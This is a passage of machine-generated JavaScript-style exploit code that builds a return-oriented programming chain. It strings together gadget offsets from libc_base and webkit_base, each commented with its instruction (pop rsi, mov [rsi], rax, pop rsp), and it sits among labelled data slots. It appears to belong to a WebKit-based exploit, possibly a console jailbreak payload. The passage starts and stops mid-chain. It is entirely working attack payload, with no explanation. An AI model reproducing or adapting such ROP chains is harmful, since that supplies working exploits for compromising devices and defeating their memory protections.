libc_base+793877 //pop rsi
]);
//L3187:
db([4294967260, 4294967295]); // -0x24
set_gadget(libc_base+206806,); //pop rdi
//L3188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+200376, //L3191
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3190:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3191:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+200424, //L3192
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3192:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3193:
db([16, 0]); // 0x10
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+200536, //L3195
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3194:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+788575,); //pop rax
//L3195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+200640, //L3197
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3196:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L3197:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+200728, //L3199
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+200744, //L3200
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3199:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3200:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+200896, //L3203
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+200928, //L3205
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+200880, //L3202
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+200912, //L3204
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3202:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3203:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3204:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3205:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+201024, //L3207
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+201008, //L3206
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3206:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3207:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3209:
ropchain+201128, //L3208
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+213360, //L3210
//L3208:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575 //pop rax
]);
//L3211:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+201264, //L3213
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3212:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L3213:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+201352, //L3215
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+201368, //L3216
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3215:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3216:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+201520, //L3219
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+201552, //L3221
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+201504, //L3218
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+201536, //L3220
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3218:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3219:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3220:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3221:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+201648, //L3223
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+201632, //L3222
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3222:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3223:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3225:
ropchain+201752, //L3224
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+210704, //L3226
//L3224:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575 //pop rax
]);
//L3227:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3228:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+201936, //L3230
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3229:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L3230:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+202024, //L3232
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202040, //L3233
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3232:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3233:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+202192, //L3236
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+202224, //L3238
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+202176, //L3235
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202208, //L3237
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3235:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3236:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3237:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3238:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+202320, //L3240
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+202304, //L3239
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3239:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3240:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3242:
ropchain+202424, //L3241
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+214688, //L3243
//L3241:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+202560, //L3245
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+202576, //L3246
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202544, //L3244
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3244:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3245:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3246:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+202664, //L3247
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+202696, //L3249
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3247:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3248:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+206806,); //pop rdi
//L3249:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3251:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L3252:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+202840, //L3254
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+202856, //L3255
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3254:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+202944, //L3257
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+202976, //L3259
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3257:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3258:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+206806,); //pop rdi
//L3259:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3261:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+792472,); //pop rcx
//L3262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+203096, //L3265
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L3264:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L3265:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+203152, //L3268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3268:
db([0, 0]); // 0x0
//L3266:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+203216, //L3270
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3269:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+792472,); //pop rcx
//L3270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+203304, //L3272
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+203320, //L3273
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3272:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3273:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+203472, //L3276
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+203504, //L3278
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+203456, //L3275
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+203488, //L3277
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3275:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3276:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3277:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3278:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+203576, //L3279
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+203592, //L3280
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3279:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+203696, //L3282
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+203744, //L3285
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+203712, //L3283
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3282:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3283:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3284:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3285:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+203856, //L3286+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+203848, //L3286
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3286:
db([0, 0]); // 0x0
set_gadgets([
ropchain+203872, //L3286+24
ropchain+209136, //L3281
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3288:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+792472,); //pop rcx
//L3289:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+203992, //L3290
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204008, //L3291
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3290:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+204160, //L3294
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204192, //L3296
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+204144, //L3293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204176, //L3295
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3293:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3294:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3295:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3296:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+204264, //L3297
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+204280, //L3298
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+204376, //L3300
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+204360, //L3299
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3299:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3300:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+204472, //L3302
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3301:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+792472,); //pop rcx
//L3302:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+204560, //L3304
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204576, //L3305
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3304:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+204720, //L3309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+204688, //L3307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204704, //L3308
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3308:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3309:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+204816, //L3311
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3310:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+792472,); //pop rcx
//L3311:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+204904, //L3313
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+204920, //L3314
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3313:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+205072, //L3317
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+205104, //L3319
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+205056, //L3316
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205088, //L3318
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3316:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3317:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3318:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3319:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+205200, //L3321
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+205184, //L3320
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3320:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3321:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3323:
ropchain+205304, //L3322
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+218720, //L3324
//L3322:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+205392, //L3326
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3325:
db([4294967240, 4294967295]); // -0x38
set_gadget(libc_base+792472,); //pop rcx
//L3326:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L3328:
db([4294967240, 4294967295]); // -0x38
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+205520, //L3330
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205536, //L3331
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3330:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+205688, //L3334
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+205720, //L3336
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+205672, //L3333
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205704, //L3335
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3333:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3334:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3335:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3336:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+205792, //L3337
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+205808, //L3338
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3337:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3338:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+205904, //L3340
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+205888, //L3339
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3339:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3340:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+205984, //L3341
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3341:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3343:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+206136, //L3345
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206152, //L3346
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+206120, //L3344
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3344:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3345:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3346:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+206320, //L3348
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206336, //L3349
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+206304, //L3347
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3347:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3348:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3349:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+206440, //L3351
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+206488, //L3354
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+206456, //L3352
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3351:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3352:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3353:
db([0, 0]); // 0x0
